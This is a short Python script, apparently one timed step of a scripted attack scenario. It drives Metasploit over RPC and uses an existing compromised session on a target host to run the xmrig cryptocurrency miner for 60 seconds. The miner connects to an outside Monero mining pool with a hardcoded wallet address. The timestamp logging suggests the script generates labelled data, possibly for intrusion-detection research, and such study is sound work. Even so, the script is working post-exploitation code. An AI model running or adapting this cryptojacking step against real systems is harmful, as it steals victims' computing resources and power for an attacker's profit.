import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    # start step 7
    output_time_file_start = 'time_step_7_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)
    
    try:
        while client.jobs.list:
            time.sleep(60)

        shell = client.sessions.session('3')
        shell.write('chmod +x ./xmrig')
        shell.write('timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u '
                    '44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN '
                    '-k --tls')
    
    except Exception as e:
        print(e)
        pass

    time.sleep(60)


main(sys.argv)
